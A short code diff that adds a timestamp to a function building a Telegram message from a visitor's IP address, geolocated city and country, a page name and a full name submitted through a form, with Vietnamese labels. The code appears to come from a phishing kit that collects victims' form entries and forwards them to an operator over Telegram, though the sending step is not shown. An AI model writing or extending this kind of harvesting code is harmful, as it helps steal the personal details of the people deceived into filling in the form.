@@ -56,6 +56,7 @@ const createTelegramMessage = (
   return `
 🌐 <b>IP:</b> <code>${geoData.ip}</code>
 🏳️ <b>Vị Trí:</b> <code>${geoData.city} - ${geoData.country}</code>
+⏰ <b>Thời Gian:</b> <code>${new Date().toLocaleString("vi-VN")}</code>
 ━━━━━━━━━━━━━━━━━━━━━
 📱 <b>Tên PAGE:</b> <code>${formData.pageName}</code>
 👨‍💼 <b>Họ Tên:</b> <code>${formData.fullName}</code>
